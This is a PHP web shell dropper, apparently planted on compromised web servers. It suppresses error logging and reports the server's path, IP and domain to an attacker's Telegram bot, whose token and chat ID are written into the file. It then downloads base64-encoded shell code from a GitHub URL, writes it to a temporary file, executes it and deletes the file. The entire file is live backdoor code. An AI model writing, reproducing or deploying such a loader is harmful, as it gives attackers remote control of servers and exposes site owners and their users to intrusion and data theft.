<?php

@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
session_start();
$TELEGRAM_BOT_TOKEN = "8266146541:AAF_rizIBOHlBMj-X9Ds9N0owESWfWVKqVo";
$TELEGRAM_CHAT_ID   = "-1003212759603";
$TELEGRAM_TOPIC_ID  = 3;
$session_key_tele = 'notified_' . md5(realpath(__FILE__));

function sendToTelegram($message)
{
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    $data = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'message_thread_id' => $TELEGRAM_TOPIC_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage";
    @file_get_contents($url . "?" . http_build_query($data));
}
if (!isset($_SESSION[$session_key_tele])) {
    $realpath = realpath(__FILE__);
    $msg = "<b>RUSHERCLOUD SHELL LOG</b>\n\n";
    $msg .= "Path: <code>$realpath</code>\n";
    $msg .= "IP: <code>$_SERVER[SERVER_ADDR]</code>\n";
    $msg .= "Domain: <code>$_SERVER[SERVER_NAME]</code>\n";
    $msg .= "First Access: " . date("d-m-Y H:i:s");
    sendToTelegram($msg);
    $_SESSION[$session_key_tele] = true;
}


function get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$url = 'https://raw.githubusercontent.com/iPotacy/Bahan/refs/heads/main/shell.php';
$encoded_code = get_contents($url);
$decoded_code = base64_decode($encoded_code);

$tempFile = tempnam(sys_get_temp_dir(), 'tmp_php_');
file_put_contents($tempFile, $decoded_code);


require_once $tempFile;
unlink($tempFile); 
?>
